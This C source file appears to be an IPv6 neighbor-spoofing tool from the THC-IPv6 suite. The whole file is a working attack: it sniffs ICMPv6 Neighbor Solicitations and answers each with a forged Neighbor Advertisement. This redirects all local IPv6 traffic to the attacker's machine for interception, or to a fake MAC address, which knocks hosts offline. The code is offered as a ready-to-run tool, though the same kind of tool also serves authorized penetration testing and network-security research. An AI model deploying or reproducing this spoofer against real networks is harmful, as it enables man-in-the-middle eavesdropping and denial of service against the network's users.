#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <pcap.h>
#include "thc-ipv6.h"

extern int debug;

unsigned char *pkt = NULL;
int pkt_len = 0;
thc_ipv6_hdr *ipv6;
int mychecksum;
char *interface;
char *ptr1, *ptr2, *ptr3, *ptr4;

void help(char *prg) {
  printf("%s %s (c) 2010 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf("Syntax: %s interface [fake-mac]\n\n", prg);
  printf("This is an \"ARP spoofer\" for IPv6, redirecting all local traffic to your own\n");
  printf("system (or nirvana if fake-mac does not exist) by answering falsely to\n");
  printf("Neighbor Solitication requests\n\n");
  exit(-1);
}

void intercept(u_char *foo, const struct pcap_pkthdr *header, const unsigned char *data) {
  unsigned char *ipv6hdr = (unsigned char *)(data + 14);

  if (debug) {
    printf("DEBUG: packet received\n");
    thc_dump_data((unsigned char *)data, header->caplen, "Received Packet");
  }
  if (ipv6hdr[6] != NXT_ICMP6 || ipv6hdr[40] != ICMP6_NEIGHBORSOL || header->caplen < 78)
    return;
  if (*(data+22) + *(data+23) + *(data+24) + *(data+25) + *(data+34) + *(data+35) + *(data+36) + *(data+37) == 0)
    return;
  if (debug)
    printf("DEBUG: packet is a valid icmp6 neighbor solitication\n");

  memcpy(ipv6->pkt, data + 6, 6);        // copy srcmac to dstmac
  memcpy(ipv6->pkt + 38, data + 22, 16); // copy srcip6 to dstip6
  memcpy(ipv6->pkt + 22, data + 62, 16); // copy target to srcip6
  memcpy(ipv6->pkt + 62, data + 62, 16); // copy target to target
  mychecksum = checksum_pseudo_header(ipv6->pkt + 22, ipv6->pkt + 38, NXT_ICMP6, ipv6->pkt + 54, 32);
  ipv6->pkt[56] = mychecksum / 256;
  ipv6->pkt[57] = mychecksum % 256;
  
  thc_send_pkt(interface, pkt, &pkt_len);

  ptr1 = thc_ipv62string(ipv6->pkt + 38);
  ptr2 = thc_string2notation(ptr1);
  ptr3 = thc_ipv62string(ipv6->pkt + 22);
  ptr4 = thc_string2notation(ptr3);
  printf("Spoofed packet to %s as %s\n", ptr2, ptr4);
  free(ptr1); free(ptr2); free(ptr3); free(ptr4);

  if (fork() == 0) {
    usleep(200);
    debug = 0;
    thc_send_pkt(interface, pkt, &pkt_len);
    sleep(1);
    thc_send_pkt(interface, pkt, &pkt_len);
    exit(0);
  }
  ipv6->pkt[56] = 0;
  ipv6->pkt[57] = 0;
  
  (void) wait3(NULL, WNOHANG, NULL);
  return;
}

int main(int argc, char *argv[]) {
  char dummy[24], mac[6] = "";
  unsigned char *ownmac = mac;

  if (argc < 2 || strncmp(argv[1], "-h", 2) == 0)
    help(argv[0]);

  if (debug)
    printf("Preparing spoofed packet for speed-up\n");
  interface = argv[1];
  if (argv[2] != NULL)
    sscanf(argv[2], "%x:%x:%x:%x:%x:%x", (unsigned int*)&mac[0], (unsigned int*)&mac[1], (unsigned int*)&mac[2], (unsigned int*)&mac[3], (unsigned int*)&mac[4], (unsigned int*)&mac[5]);
  else
    ownmac = thc_get_own_mac(interface);
  memset(dummy, 'X', sizeof(dummy));
  dummy[16] = 2;
  dummy[17] = 1;
  memcpy(&dummy[18], ownmac, 6);

  if ((pkt = thc_create_ipv6(interface, PREFER_LINK, &pkt_len, dummy, dummy, 255, 0, 0, 0, 0)) == NULL)
    return -1;
  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_NEIGHBORADV, 0, ICMP6_NEIGHBORADV_SOLICIT | ICMP6_NEIGHBORADV_OVERRIDE, dummy, 24, 0) < 0)
    return -1;
  if (thc_generate_pkt(interface, ownmac, dummy, pkt, &pkt_len) < 0)
    return -1;
  ipv6 = (thc_ipv6_hdr *) pkt;
  memset(ipv6->pkt + 56, 0, 2); // reset checksum to zero
  if (debug) {
    thc_dump_data(ipv6->pkt, ipv6->pkt_len, "Prepared spoofing packet");
    printf("\n");
  }

  printf("Remember to enable routing (ip_forwarding), you will denial service otherwise!\n");
  printf("Started ICMP6 Neighbor Solitication Interceptor (Press Control-C to end) ...\n");
  return thc_pcap_function(interface, "ip6", (char *) intercept, NULL);
}
